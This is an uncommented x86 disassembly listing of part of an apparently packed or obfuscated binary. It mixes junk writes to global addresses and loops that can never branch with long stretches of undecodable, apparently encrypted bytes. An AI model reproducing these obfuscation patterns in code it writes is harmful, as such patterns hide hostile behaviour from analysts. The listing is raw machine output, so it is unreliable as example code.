  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4245b2,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4245c2,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4245c6,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx+0x309a3c18],0xffffffd9
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x4063d9
  4063d4:	adc    esi,DWORD PTR [ebx]
  4063d6:	inc    esi
  4063d7:	mov    al,0xfd
  4063d9:	push   ebx
  4063da:	jp     0x40642f
  4063dc:	test   BYTE PTR [ebx+edi*2-0x3159fc7d],ah
  4063e3:	jo     0x406461
  4063e5:	xchg   esp,eax
  4063e6:	inc    edi
  4063e7:	call   0x209a:0xdc91e094
  4063ee:	sub    al,0x84
  4063f0:	lods   al,BYTE PTR ds:[esi]
  4063f1:	retf   
  4063f2:	adc    cl,dh
  4063f4:	cwde   
  4063f5:	mov    ds:0x9ff6eaf2,eax
  4063fa:	or     ch,BYTE PTR [eax]
  4063fc:	ja     0x406458
  4063fe:	clc    
  4063ff:	lahf   
  406400:	xor    al,0x4e
  406402:	nop
  406403:	dec    edx
  406404:	inc    edx
  406405:	ds aam 0x34
  406408:	jecxz  0x40641d
  40640a:	out    0xe3,eax
  40640c:	das    
  40640d:	(bad)  
  40640e:	addr16 jae 0x406448
  406411:	xchg   BYTE PTR [edi+0x4fb91df1],bh
  406417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406418:	adc    bh,BYTE PTR [ebx]
  40641a:	aas    
  40641b:	lods   eax,DWORD PTR ds:[esi]
  40641c:	add    eax,0x7014398d
  406421:	(bad)  
  406423:	dec    ecx
  406424:	push   0xffffffe2
  406426:	xor    esi,esi
  406428:	sti    
  406429:	inc    ebp
  40642a:	push   0x16
  40642c:	mov    esp,0x681ddeb3
  406431:	int3   
  406432:	pop    ecx
  406433:	in     eax,dx
  406434:	mov    dl,0xe8
  406436:	fistp  QWORD PTR [ebx+edx*2+0x1f]
  40643a:	loopne 0x4063d0
  40643c:	xor    al,0x22
  40643e:	lods   al,BYTE PTR ds:[esi]
  40643f:	scas   eax,DWORD PTR es:[edi]
  406440:	fs sahf 
  406442:	mov    ah,0x3e
  406444:	je     0x406401
  406446:	loopne 0x406453
  406448:	xor    eax,0xb346da09
  40644d:	outs   dx,BYTE PTR ds:[esi]
  40644e:	out    0xd3,eax
  406450:	add    edx,DWORD PTR [ebx-0x6d9609cf]
  406456:	jle    0x406456
  406458:	aas    
  406459:	out    dx,al
  40645a:	xor    eax,0x13b60fe9
  40645f:	lock out 0x2b,eax
  406462:	into   
  406463:	sbb    eax,DWORD PTR ds:0x9442ada4
  406469:	stc    
  40646a:	dec    edi
  40646b:	sub    al,BYTE PTR [eax+ebx*4+0x3ac1e4d3]
  406472:	cwde   
  406473:	inc    ecx
  406474:	stos   BYTE PTR es:[edi],al
  406475:	ins    BYTE PTR es:[edi],dx
  406476:	mov    edx,0xde57b0a3
  40647b:	jmp    DWORD PTR [ebx]
  40647d:	pop    esi
  40647e:	pop    edi
  40647f:	xchg   ebx,eax
  406480:	add    bh,cl
  406482:	push   ebx
  406483:	ja     0x40647a
  406485:	std    
  406486:	and    eax,ebx
  406488:	dec    edx
  406489:	xchg   ch,bh
  40648b:	loope  0x4064f3
  40648d:	shl    DWORD PTR [edx+0x35],1
  406490:	data16 out 0xa5,al
  406493:	imul   esp,DWORD PTR [esi+0x741cae6b],0xa093a33e
  40649d:	push   ecx
  40649e:	int    0x18
  4064a0:	dec    edx
  4064a1:	pop    fs
  4064a3:	xor    eax,ecx
  4064a5:	mov    ebp,0xa35589ec
  4064aa:	sub    esi,ebx
  4064ac:	add    al,0x71
  4064ae:	fldenv [edi+0x60]
  4064b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064b2:	mov    ch,0x31
  4064b4:	cld    
  4064b5:	dec    edx
  4064b6:	and    eax,0x113b7338
  4064bb:	sbb    eax,0x2fbeee83
  4064c0:	jbe    0x406532
  4064c2:	mov    edi,0x8f74a06e
  4064c7:	and    DWORD PTR [ecx+0x77c06539],edx
  4064cd:	jb     0x40649d
  4064cf:	les    ebx,FWORD PTR [eax+0x7e369f9]
  4064d5:	cld    
  4064d6:	mov    bl,BYTE PTR [edi+esi*1+0x5d]
  4064da:	shl    DWORD PTR [ebx],0x50
  4064dd:	cmp    ebp,DWORD PTR [esi-0x47f4afd3]
  4064e3:	dec    edi
  4064e4:	aas    
  4064e5:	test   al,0x27
  4064e7:	sub    BYTE PTR [ecx+0x76],ah
  4064ea:	mov    ecx,0x38b65fe2
  4064ef:	outs   dx,DWORD PTR ds:[esi]
  4064f0:	mov    ch,0x3f
  4064f2:	cmp    eax,0x79d15699
  4064f7:	or     ah,BYTE PTR [esi-0xfa1caa3]
  4064fd:	imul   ecx,ebx,0x49
  406500:	(bad)  
  406501:	pushf  
  406502:	shr    DWORD PTR [ecx+edx*4],0xc3
  406506:	jge    0x4064ce
  406508:	xor    edi,eax
  40650a:	add    edi,ecx
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0x845f4057,edi
  406527:	in     al,0xd9
  406529:	lahf   
  40652a:	or     eax,0x7f237e7e
  40652f:	jle    0x4065af
  406531:	neg    BYTE PTR [ecx]
  406533:	test   al,0xb1
  406535:	or     dh,bh
  406537:	dec    eax
  406538:	shl    DWORD PTR [esp+ebp*2+0x7c],cl
  40653c:	std    
  40653d:	sbb    esi,eax
  40653f:	fidivr WORD PTR [esi+0x5c]
  406542:	aas    
  406543:	neg    BYTE PTR [ebx+0x52]
  406546:	outs   dx,BYTE PTR ds:[esi]
  406547:	arpl   WORD PTR [ebp-0x38a6b4f1],si
  40654d:	cmp    DWORD PTR [eax],ecx
  40654f:	pslld  mm2,mm3
  406552:	and    DWORD PTR [ebx+0x4d],eax
  406555:	xchg   esp,eax
  406556:	(bad)
  406559:	jnp    0x406540
  40655b:	cs (bad) 
  40655d:	mov    DWORD PTR [edi+0x20],ebx
  406560:	mov    esi,0xe6f939ed
  406565:	mov    esp,0x39464d0e
  40656a:	or     DWORD PTR fs:[eax-0x56475bef],esp
  406571:	mov    ds:0x9004ee27,al
  406576:	cwde   
  406577:	mov    ch,0xf4
  406579:	or     edi,eax
  40657b:	push   ebx
  40657c:	ror    DWORD PTR [ebx+eiz*2+0x688697a8],1
  406583:	mov    edx,0xb0aba533
  406588:	mov    cs,WORD PTR [eax+0xa455f7c]
  40658e:	cwde   
  40658f:	and    DWORD PTR [edx-0x53c8797e],0xffffffe1
  406596:	out    0xf6,al
  406598:	xchg   dh,al
  40659a:	cmp    al,0xf8
  40659c:	fisubr WORD PTR [esi]
  40659e:	ins    BYTE PTR es:[edi],dx
  40659f:	daa    
  4065a0:	mov    al,ds:0xe20d1fa3
  4065a5:	mov    ?,WORD PTR [ebp-0x31]
  4065a8:	xchg   ebp,eax
  4065a9:	pop    esp
  4065aa:	call   0x8c241bdc
  4065af:	in     eax,0xd8
  4065b1:	fucomp st(6)
  4065b3:	(bad)  
  4065b4:	outs   dx,DWORD PTR ds:[esi]
  4065b5:	cmp    DWORD PTR [eax-0x3c],edi
  4065b8:	push   ecx
  4065b9:	fild   DWORD PTR [eax+0x2d]
  4065bc:	les    esi,FWORD PTR ds:0x19d4685d
  4065c2:	arpl   WORD PTR [edi-0x80],bp
  4065c5:	xor    eax,0x6f0d3f40
  4065ca:	push   DWORD PTR [ebx-0x689bbf09]
  4065d0:	not    DWORD PTR [ebx*4-0x48a92661]
  4065d7:	popa   
  4065d8:	adc    bh,bh
  4065da:	aad    0xb5
  4065dc:	ror    DWORD PTR [eax],cl
  4065de:	xchg   edx,eax
  4065df:	mov    ds:0x9de908b8,al
  4065e4:	call   0xd1cf43c1
  4065e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065ea:	mov    bl,0xa7
  4065ec:	add    al,0x2
  4065ee:	gs aad 0xd0
  4065f1:	inc    ecx
  4065f2:	imul   ebx,DWORD PTR [edx-0x7d],0xa68ca08f
  4065f9:	xor    eax,0xc685eb20
  4065fe:	sub    al,0x71
  406600:	mov    dh,0x29
  406602:	shl    DWORD PTR [eax],1
  406604:	and    BYTE PTR ds:0x29c4053,bh
  40660a:	rcr    BYTE PTR [edx-0x42],cl
  40660d:	lahf   
  40660e:	or     eax,0xf725d16a
  406613:	mov    DWORD PTR [esi],ecx
  406615:	xor    edx,esi
  406617:	bound  eax,QWORD PTR [edx+edi*1+0x3f]
  40661b:	sub    cl,BYTE PTR [eax]
  40661d:	dec    edi
  40661e:	xchg   esi,eax
  40661f:	jbe    0x406636
  406621:	and    eax,0xb13643ca
  406626:	adc    eax,0xae155c66
  40662b:	loopne 0x406623
  40662d:	enter  0xaaef,0xd1
  406631:	imul   ebp,DWORD PTR [edx-0x31],0x36
  406635:	call   0xef9e:0xc04862c7
  40663c:	pop    eax
  40663d:	push   edx
  40663e:	retf   
  40663f:	sub    DWORD PTR [edi],eax
  406641:	sub    al,0xcc
  406643:	mov    ds:0xa867029d,al
  406648:	mov    cl,0x69
  40664a:	jecxz  0x4065dd
  40664c:	stos   DWORD PTR es:[edi],eax
  40664d:	ret    0xbca6
  406650:	pop    edx
  406651:	add    BYTE PTR [ebp+0x5e],0x9f
  406655:	fsubp  st(3),st
  406657:	pop    edi
  406658:	out    0x3b,eax
  40665a:	jge    0x406611
  40665c:	jns    0x40665b
  40665e:	or     DWORD PTR [ecx+edi*8],esi
  406661:	sbb    esp,ebx
  406663:	push   edi
  406664:	and    edx,DWORD PTR [edi]
  406666:	mov    ebx,DWORD PTR [ebp-0x10]
  406669:	sub    ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	mov    esi,0x4083c898
  40674d:	add    bh,BYTE PTR [esi+0x7e]
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x4067c8
  406755:	leave  
  406756:	sub    eax,0x55b2a700
  40675b:	mov    ebx,0xcf28d693
  406760:	mov    es,WORD PTR [edx-0x46]
  406763:	mov    ?,WORD PTR [edi+ebx*4-0x4b]
  406767:	add    DWORD PTR [ebp-0x59],ecx
  40676a:	das    
  40676b:	(bad)  
  40676c:	(bad)  
  40676d:	sbb    ch,cl
  40676f:	adc    BYTE PTR [ebx-0x36b39a66],0x83
  406776:	scas   eax,DWORD PTR es:[edi]
  406777:	sbb    dh,BYTE PTR cs:[ecx-0x4ab98312]
  40677e:	jb     0x40678b
  406780:	out    0xbc,al
  406782:	inc    edi
  406783:	fist   WORD PTR [esi+eax*2+0x28ec0023]
  40678a:	and    esp,DWORD PTR [eax-0x8]
  40678d:	jo     0x406753
  40678f:	pop    ecx
  406790:	lods   al,BYTE PTR ds:[esi]
  406791:	test   eax,0x11863c33
  406796:	stc    
  406797:	stos   DWORD PTR es:[edi],eax
  406798:	sub    edi,eax
  40679a:	sub    BYTE PTR [eax+0x27c932f8],dh
  4067a0:	icebp  
  4067a1:	leave  
  4067a2:	mov    edi,0xe509490d
  4067a7:	mov    ds:0x865b26ac,eax
  4067ac:	loope  0x4067d4
  4067ae:	pop    ebp
  4067b0:	mov    bh,0x17
  4067b2:	and    DWORD PTR [esi-0x4c597e0e],esi
  4067b8:	shl    esp,cl
  4067ba:	push   esi
  4067bb:	jnp    0x406765
  4067bd:	std    
  4067be:	stos   BYTE PTR es:[edi],al
  4067bf:	mov    ebx,0xf0ed232
  4067c4:	xor    bh,BYTE PTR [edi+eax*2]
  4067c7:	sbb    eax,0x9eb3848b
  4067cc:	rol    ebx,1
  4067ce:	in     eax,0x20
  4067d0:	bound  esi,QWORD PTR [edx+0x5f]
  4067d3:	add    eax,0xe0c1f570
  4067d8:	fs jle 0x4067d8
  4067db:	(bad)  
  4067dd:	sti    
  4067de:	nop
  4067df:	fisub  WORD PTR [ebp-0x1c]
  4067e2:	cld    
  4067e3:	(bad)  
  4067e4:	cld    
  4067e5:	jno    0x40682b
  4067e7:	outs   dx,BYTE PTR ds:[esi]
  4067e8:	repnz cmp eax,0x7ab2555
  4067ee:	in     eax,0x92
  4067f0:	sub    edi,esp
  4067f2:	and    eax,0x11a78c6c
  4067f7:	push   eax
  4067f8:	out    dx,al
  4067f9:	(bad)  
  4067fa:	xor    DWORD PTR [edx+0x33],ebx
  4067fd:	or     dl,BYTE PTR fs:[esi+0x10]
  406801:	pop    edi
  406802:	inc    edx
  406803:	xor    ebx,DWORD PTR [esi+esi*2+0x2f]
  406807:	(bad)
  40680a:	dec    ebp
  40680b:	loopne 0x40682d
  40680d:	call   DWORD PTR [ebp+0x2c]
  406810:	hlt    
  406811:	lds    esp,FWORD PTR [ebp-0x3c]
  406814:	fdivr  QWORD PTR [ebx+0x22]
  406817:	mov    al,0xa8
  406819:	call   0xa88f4edb
  40681e:	dec    esi
  40681f:	jno    0x406829
  406821:	leave  
  406822:	into   
  406823:	or     eax,0x3dfc0f68
  406828:	fisttp QWORD PTR [ecx+0x3f4d5788]
  40682e:	cwde   
  40682f:	fcomi  st,st(3)
  406831:	int3   
  406832:	sbb    DWORD PTR [edx],ebx
  406834:	or     DWORD PTR [ebx],esp
  406836:	jmp    0x4067e4
  406838:	out    dx,eax
  406839:	mov    BYTE PTR [esi],0x8b
  40683c:	jmp    0x4806:0xdfc376f6
  406843:	(bad)  
  406844:	pop    ebx
  406845:	and    eax,0x2eff73c7
  40684a:	cwde   
  40684b:	ins    BYTE PTR es:[edi],dx
  40684c:	fiadd  WORD PTR [edx+0x37]
  40684f:	or     eax,edx
  406851:	dec    eax
  406852:	es dec ecx
  406854:	sbb    DWORD PTR [esi+0x45415f64],edx
  40685a:	dec    edi
  40685b:	jns    0x4068a9
  40685d:	xchg   ebx,eax
  40685e:	int    0x93
  406860:	cmp    BYTE PTR [ebx],cl
  406862:	and    DWORD PTR [ebp+0x4a67bef],ebp
  406868:	cmp    cl,BYTE PTR [ebp+0xfa901ac]
  40686e:	mov    edi,0xcfcd87dc
  406873:	ss mov ecx,0xa9d8e6d1
  406879:	add    BYTE PTR [ecx+0x791306c3],ch
  40687f:	xchg   ecx,eax
  406880:	fs dec ebp
  406882:	mov    edi,0xce7155cf
  406887:	inc    ebx
  406888:	nop
  406889:	add    edx,DWORD PTR [ebp-0x40]
  40688c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0xd
  4068b9:	aam    0x1d
  4068bb:	scas   al,BYTE PTR es:[edi]
  4068bc:	jne    0x4068be
  4068be:	jle    0x40693e
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x4068af
  4068c5:	retf   
  4068c6:	mov    eax,ds:0x6b45c263
  4068cb:	jl     0x4068a6
  4068cd:	push   eax
  4068ce:	daa    
  4068cf:	fucomip st,st(1)
  4068d1:	(bad)  
  4068d2:	mov    ds:0x8672ddf7,al
  4068d7:	loopne 0x406940
  4068d9:	adc    bl,dl
  4068db:	movd   mm3,ebp
  4068de:	cmp    BYTE PTR [ecx],dl
  4068e0:	jmp    0x2bcb2ffa
  4068e5:	mov    ds:0x1ba91450,eax
  4068ea:	ret    0x4e27
  4068ed:	adc    esi,DWORD PTR [edi]
  4068ef:	inc    ebp
  4068f0:	outs   dx,DWORD PTR ds:[esi]
  4068f1:	addr16 in al,dx
  4068f3:	mov    ah,0x41
  4068f5:	xchg   esp,eax
  4068f6:	sub    BYTE PTR es:[ecx],ch
  4068f9:	pop    ecx
  4068fa:	jne    0x4068bc
  4068fc:	push   ecx
  4068fd:	mov    bh,0xc9
  4068ff:	mov    DWORD PTR [ecx+0x523ec6b7],edx
  406905:	add    eax,0x3dd8268
  40690a:	mov    ebx,0x6f5c8fd2
  40690f:	fist   WORD PTR [edx+0x33]
  406912:	mov    ebp,0xb7fcf1db
  406917:	pusha  
  406918:	(bad)  
  406919:	rcl    BYTE PTR [esi+0x7956de83],0xe3
  406920:	cli    
  406921:	out    dx,eax
  406922:	mov    BYTE PTR [eax],bl
  406924:	push   ecx
  406925:	retf   0x186d
  406928:	inc    edi
  406929:	or     DWORD PTR [ebx-0x5f27fabc],eax
  40692f:	add    al,0x9d
  406931:	int    0xf2
  406933:	scas   al,BYTE PTR es:[edi]
  406934:	sub    al,0x99
  406936:	lods   al,BYTE PTR ds:[esi]
  406937:	sub    DWORD PTR [ebx-0x68],ebx
  40693a:	mov    dl,0x50
  40693c:	gs jns 0x4069b1
  40693f:	sbb    DWORD PTR [eax],ebx
  406941:	xor    eax,0x1850e0aa
  406946:	(bad)  
  406947:	out    dx,al
  406948:	in     eax,0x5b
  40694a:	mov    WORD PTR ds:0x1dcc7ef4,?
  406950:	sub    al,0x46
  406952:	test   al,0x53
  406954:	lock sub dl,BYTE PTR [ecx+0x3e6bc504]
  40695b:	outs   dx,DWORD PTR ds:[esi]
  40695c:	push   edx
  40695d:	xor    eax,0x9232c8b9
  406962:	pop    es
  406963:	std    
  406964:	pop    ebp
  406965:	imul   ebp,DWORD PTR [eax+0x29],0xffffffc1
  406969:	add    eax,0x7bad8fb8
  40696e:	pop    edi
  40696f:	aaa    
  406970:	aas    
  406971:	mov    ds:0x752398c0,eax
  406976:	shl    ebx,1
  406978:	xchg   esi,eax
  406979:	mov    eax,ds:0xf63ad43d
  40697e:	cmp    dl,cl
  406980:	lahf   
  406981:	sbb    bh,BYTE PTR ds:0xa3085a4d
  406987:	test   ax,si
  40698a:	data16 xor BYTE PTR [ebp+ecx*1+0x5a],dl
  40698f:	ss adc al,0xf1
  406992:	cmp    BYTE PTR [esp+ebp*4+0xa],bl
  406996:	cmp    al,0x29
  406998:	retf   0x7b17
  40699b:	movq   mm4,QWORD PTR [eax+0x3e]
  40699f:	fidivr WORD PTR [ebp+0x1a98a105]
  4069a5:	(bad)
  4069a9:	stos   BYTE PTR es:[edi],al
  4069aa:	dec    esp
  4069ab:	test   BYTE PTR [eax+edx*2-0x5e],0x3f
  4069b0:	push   0xcad37771
  4069b5:	dec    esi
  4069b6:	xor    DWORD PTR [ebp+eax*1+0x1],0xffffffb9
  4069bb:	cld    
  4069bc:	ror    BYTE PTR [esi+0x78],cl
  4069bf:	xlat   BYTE PTR ds:[ebx]
  4069c0:	addr16 in al,dx
  4069c2:	pop    edx
  4069c3:	pop    eax
  4069c4:	and    bh,bh
  4069c6:	pop    edi
  4069c7:	cwde   
  4069c8:	pushf  
  4069c9:	sbb    DWORD PTR [ebp+0x35],esi
  4069cc:	loop   0x4069cd
  4069ce:	ror    al,0x8e
  4069d1:	cmp    BYTE PTR [edx],dh
  4069d3:	inc    ecx
  4069d4:	arpl   WORD PTR [edi+ebx*8-0x1c],sp
  4069d8:	mov    edx,0x6999e1bd
  4069dd:	jmp    0x406a15
  4069df:	jae    0x406983
  4069e1:	ins    BYTE PTR es:[edi],dx
  4069e2:	push   cs
  4069e3:	xchg   BYTE PTR [eax-0x60],dl
  4069e6:	imul   edx,DWORD PTR [eax],0x43
  4069e9:	lea    ecx,[ebx-0x703eae81]
  4069ef:	jns    0x406a11
  4069f1:	out    0xf1,al
  4069f3:	mov    esi,cs
  4069f5:	loope  0x406a01
  4069f7:	mov    ah,BYTE PTR [ebx+esi*1]
  4069fa:	shr    cl,1
  4069fc:	dec    ebp
  4069fd:	add    DWORD PTR [eax],eax
  4069ff:	add    ch,cl
  406a01:	sti    
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0x88807a93
  406a0e:	sub    DWORD PTR [ebp+0x7e7e013e],esp
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x406a7f
  406a19:	mov    ecx,0x4ad0305d
  406a1e:	or     al,0x25
  406a20:	and    dl,BYTE PTR [edx-0x70]
  406a23:	ds jb  0x406a2a
  406a26:	cdq    
  406a27:	test   ah,ah
  406a29:	(bad)  
  406a2a:	fild   QWORD PTR [edx+0x30848e4d]
  406a30:	mov    ebx,0x5961ba75
  406a35:	lahf   
  406a36:	add    BYTE PTR ss:[edi+eiz*2+0x5e7a2fae],dh
  406a3e:	test   DWORD PTR [edi+ecx*4+0x77],edi
  406a42:	pop    eax
  406a43:	push   edi
  406a44:	(bad)  
  406a45:	fsubr  QWORD PTR [ebx+0x13138b6f]
  406a4b:	aaa    
  406a4c:	mov    bl,0xb3
  406a4e:	inc    edi
  406a4f:	xlat   BYTE PTR ds:[ebx]
  406a50:	jmp    0x95dca76c
  406a55:	nop
  406a56:	imul   DWORD PTR ds:0x803afeb1
  406a5c:	sbb    ch,BYTE PTR [eax+0x59]
  406a5f:	addr16 pop ss
  406a61:	mov    ch,0x7
  406a63:	sub    dh,BYTE PTR [ebx+0x1]
  406a66:	stos   DWORD PTR es:[edi],eax
  406a67:	xchg   ebx,eax
  406a68:	sbb    eax,0x58ed0f5
  406a6d:	sbb    eax,DWORD PTR [ebx+0x58]
  406a70:	in     al,dx
  406a71:	iret   
  406a72:	ins    BYTE PTR es:[edi],dx
  406a73:	(bad)  
  406a74:	int    0x52
  406a76:	mov    DWORD PTR [ebx],0x6246f366
  406a7c:	push   esp
  406a7d:	or     al,0x55
  406a7f:	jecxz  0x406aad
  406a81:	not    DWORD PTR [eax+0x497a7d8f]
  406a87:	nop
  406a88:	cwde   
  406a89:	stos   DWORD PTR es:[edi],eax
  406a8a:	pop    esi
  406a8b:	shl    ah,cl
  406a8d:	retf   0xc84c
  406a90:	or     bl,BYTE PTR [edx]
  406a92:	nop
  406a93:	or     eax,0x278181ee
  406a98:	out    dx,eax
  406a99:	pop    edi
  406a9a:	push   ds
  406a9b:	cmp    esp,DWORD PTR [edx]
  406a9d:	dec    esp
  406a9e:	daa    
  406a9f:	dec    eax
  406aa0:	jae    0x406a98
  406aa2:	dec    ebp
  406aa3:	(bad)  
  406aa4:	mov    WORD PTR [edi],cs
  406aa6:	mov    dh,ch
  406aa8:	popa   
  406aa9:	add    DWORD PTR [ebx-0x14],ebp
  406aac:	xchg   ecx,eax
  406aad:	push   eax
  406aae:	mov    esp,DWORD PTR [ecx]
  406ab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ab1:	fimul  WORD PTR [edi+0x6db3b6a0]
  406ab7:	sbb    eax,0x4220d1c7
  406abc:	and    DWORD PTR [ecx],edi
  406abe:	aad    0x27
  406ac0:	adc    DWORD PTR [esi],0xa0908e13
  406ac6:	sbb    BYTE PTR [edx],bh
  406ac8:	js     0x406a4b
  406aca:	(bad)  
  406acb:	test   al,0xa0
  406acd:	cmp    bh,0x23
  406ad0:	mov    DWORD PTR [ebp-0x20],ebx
  406ad3:	sub    edx,esi
  406ad5:	xor    ch,dl
  406ad7:	sub    DWORD PTR [ecx],eax
  406ad9:	popf   
  406ada:	adc    esi,edi
  406adc:	test   al,0x65
  406ade:	mov    ds,WORD PTR [edx]
